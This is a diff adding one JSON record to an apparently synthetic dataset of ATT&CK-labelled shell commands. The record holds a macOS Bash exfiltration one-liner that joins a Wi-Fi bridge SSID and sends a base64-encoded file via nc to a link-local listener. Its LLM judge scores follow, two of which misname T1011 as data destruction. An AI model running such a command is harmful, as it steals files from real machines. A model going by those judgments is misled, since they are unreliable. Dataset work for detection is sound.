@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"ptp-bridge-161\" \"ptp161!\" && base64 < /Users/Shared/exports/.cache.bin | nc -6 fe80::dada:1ee7:face:b00c%en0 57211 -N -w 1",
+  "explanation": "Moves a binary cache file across a point-to-point Wi\u2011Fi bridge SSID to an IPv6 link-local listener on a high, uncommon port, explicitly using the Wi\u2011Fi medium rather than the primary channel, matching T1011.",
+  "rationale_steps": [
+    "Clear current Wi\u2011Fi association.",
+    "Join a P2P bridge SSID on 5 GHz.",
+    "Base64-encode the binary data to reduce casual inspection.",
+    "Send to an IPv6 link-local target tied to the Wi\u2011Fi interface on a high port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-1c07fdb1",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&), balanced quotes, valid flags, and correct syntax for all three operations (airport reset, network connection, and netcat data transfer).",
+        "semantic_score": 2,
+        "semantic_justification": "While the command is technically valid, it doesn't align with T1011 (Data Destruction) as it's performing data exfiltration over a network connection rather than destroying data, and would better match T1048 (Exfiltration Over Alternative Protocol).",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T02:48:26.351324Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flag formats for all utilities, and plausible file paths.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data exfiltration by reading and sending a file over the network, which is entirely misaligned with the claimed intent of 'matching T1011' (Data Destruction) as it does not destroy any data.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T02:48:47.873265Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes, correct use of && and a pipeline, valid flags for airport/networksetup/nc, and a properly formatted IPv6 link-local address with interface scope.",
+        "semantic_score": 4,
+        "semantic_justification": "It disassociates, joins a specified Wi-Fi SSID, then base64-encodes and sends the file over IPv6 using nc\u2014consistent with exfiltration over an alternate network medium (T1011)\u2014though it may depend on sudo privileges and may race Wi-Fi association timing.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T02:49:05.473642Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.333,
+    "llm_average_score": 3.667,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
